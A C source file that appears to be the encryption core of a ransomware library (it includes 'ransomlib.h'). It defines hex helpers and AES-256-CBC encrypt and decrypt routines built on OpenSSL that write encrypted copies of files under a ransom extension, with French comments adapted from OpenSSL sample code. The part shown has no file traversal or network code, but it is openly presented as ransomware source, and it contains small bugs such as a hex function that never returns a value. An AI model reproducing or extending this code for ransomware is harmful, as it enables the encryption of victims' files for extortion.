#include "ransomlib.h"



void handleErrors(void)
{
    ERR_print_errors_fp(stderr);
    abort();
}


int bytes_to_hexa(const unsigned char bytes_string[], char *hex_string, int size)
{
    for (size_t i = 0; i < size; i++) {
        hex_string += sprintf(hex_string, "%.2x", bytes_string[i]);
    }
}

void hexa_to_bytes(char hex_string[], unsigned char val[], int size)
{
    char *pos = hex_string;

    for (size_t count = 0; count < size; count++) {
        sscanf(pos, "%2hhx", &val[count]);
        pos += 2;
    }
}


int encrypt(unsigned char *key, unsigned char *iv, char *plaintext_file)
{
    EVP_CIPHER_CTX *ctx;
    const EVP_CIPHER *cipher_type = EVP_aes_256_cbc();
    int cipher_block_size = EVP_CIPHER_block_size(cipher_type);
    unsigned char in_buf[BUFSIZE], out_buf[BUFSIZE + cipher_block_size];
    int num_bytes_read, out_len;
    int len;

    FILE *fIN = fopen(plaintext_file,"rb");
    if(fIN==NULL)
    {
       handleErrors();
    }
    char encrypted_file[1024];
    snprintf(encrypted_file,sizeof(encrypted_file),"%s.%s",plaintext_file,ENCRYPT_EXT);
    printf("%s\n",encrypted_file);
    FILE *fOUT = fopen(encrypted_file,"wb");
    if(fOUT==NULL)
    {
       handleErrors();
    }
    
    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
	 * Initialisez l'opération de chiffrement. IMPORTANT - assurez-vous d'utiliser une clé
     * et taille IV appropriée pour votre chiffrement
     * Dans cet exemple, nous utilisons AES 256 bits (c'est-à-dire une clé de 256 bits). Le
     * La taille IV pour *la plupart* des modes est la même que la taille du bloc. Pour AES ceci
     * est de 128 bits
     */
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Fournissez le message à chiffrer et obtenez la sortie chiffrée.
     * EVP_EncryptUpdate peut être appelé plusieurs fois si nécessaire
     */
    num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);

    while(num_bytes_read > 0)
    {   
    	if(!EVP_EncryptUpdate(ctx, out_buf, &out_len, in_buf, num_bytes_read)){
			handleErrors();}

	fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);
	num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);

    }
    if(1 != EVP_EncryptFinal_ex(ctx, out_buf, &out_len))
        handleErrors();

    /*
     * Finalisez le cryptage. D'autres octets de texte chiffré peuvent être écrits à
     * cette étape.
     */

    fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);
   
    fclose(fIN);
    fclose(fOUT);

    return 0;
}


int decrypt(unsigned char *key, unsigned char *iv, char *cipher_file)
{
    EVP_CIPHER_CTX *ctx;
    const EVP_CIPHER *cipher_type = EVP_aes_256_cbc();
    int cipher_block_size = EVP_CIPHER_block_size(cipher_type);
    unsigned char in_buf[BUFSIZE], out_buf[BUFSIZE + cipher_block_size];
    int num_bytes_read, out_len;
    int len;

    FILE *fIN = fopen(cipher_file,"rb");
    if(fIN==NULL)
    {
       handleErrors();
    }
    char plaintext_file[1024];
    snprintf(plaintext_file,strlen(cipher_file)-(EXT_LEN),"%s",cipher_file);
    FILE *fOUT = fopen(plaintext_file,"wb");
    if(fOUT==NULL)
    {
       handleErrors();
    }


    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialiser l'opération de déchiffrement. IMPORTANT - assurez-vous d'utiliser une clé
     * et taille IV appropriée pour votre chiffrement
     * Dans cet exemple, nous utilisons AES 256 bits (c'est-à-dire une clé de 256 bits). Le
     * La taille IV pour *la plupart* des modes est la même que la taille du bloc. Pour AES ceci
     * est de 128 bits
     */
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Fournissez le message à déchiffrer et obtenez la sortie en clair.
     * EVP_DecryptUpdate peut être appelé plusieurs fois si nécessaire.
     */
    num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);

    while(num_bytes_read > 0)
    {
        if(!EVP_DecryptUpdate(ctx, out_buf, &out_len, in_buf, num_bytes_read)){
                        handleErrors();}

        fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);
        num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);
 
    }
   if(1 != EVP_DecryptFinal_ex(ctx, out_buf, &out_len))
        handleErrors();

    fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);

    

    /* Clean up */
    fclose(fOUT);
    fclose(fIN);
    EVP_CIPHER_CTX_free(ctx);

    return 0;
}


